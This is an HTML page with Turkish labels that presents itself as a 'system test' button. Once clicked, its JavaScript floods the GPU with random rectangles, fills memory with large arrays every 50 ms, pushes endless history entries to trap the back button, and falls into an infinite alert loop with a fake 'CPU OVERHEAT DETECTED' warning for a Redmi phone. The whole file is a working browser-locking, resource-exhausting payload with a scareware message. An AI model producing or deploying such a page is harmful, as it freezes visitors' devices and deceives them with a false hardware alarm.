<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>CRITICAL SYSTEM OVERLOAD</title>
    <style>
        body { background: #000; color: #f00; font-family: 'Courier New', Courier, monospace; overflow: hidden; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        #warning { font-size: 24px; text-align: center; border: 2px solid #f00; padding: 20px; animation: blink 0.1s infinite; cursor: pointer; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
        canvas { position: absolute; top: 0; left: 0; z-index: -1; }
    </style>
</head>
<body>

    <div id="warning" onclick="launchChaos()">SİSTEMİ TEST ETMEK İÇİN DOKUN<br>(TEHLİKELİ)</div>
    <div id="status"></div>

    <script>
        function launchChaos() {
            document.getElementById('warning').innerText = "SİSTEM ÇÖKÜYOR...";
            
            // 1. GPU (Ekran Kartı) Yüklemesi: Binlerce hareketli nesne çizdirir
            const canvas = document.createElement('canvas');
            document.body.appendChild(canvas);
            const ctx = canvas.getContext('2d');
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;

            function draw() {
                for(let i = 0; i < 5000; i++) {
                    ctx.fillStyle = '#' + Math.floor(Math.random()*16777215).toString(16);
                    ctx.fillRect(Math.random()*canvas.width, Math.random()*canvas.height, 50, 50);
                }
                requestAnimationFrame(draw); // Ekran tazeleme hızını zorlar
            }
            draw();

            // 2. CPU & RAM (İşlemci ve Bellek) Yüklemesi
            setInterval(() => {
                // Devasa veri blokları oluşturup hafızaya atar
                let junk = [];
                for (let i = 0; i < 1000000; i++) {
                    junk.push(Math.exp(Math.random() * Math.PI));
                }
                console.log("Memory Leak active: " + junk.length);
                
                // Sonsuz geçmiş ekleme (Geri tuşunu kilitler)
                window.history.pushState(null, null, window.location.href);
            }, 50);

            // 3. Tarayıcıyı Kilitleyen Döngü
            setTimeout(() => {
                while(true) {
                    alert("REDMI NOTE 13 PRO 5G - CPU OVERHEAT DETECTED!");
                }
            }, 2000);
        }
    </script>
</body>
</html>
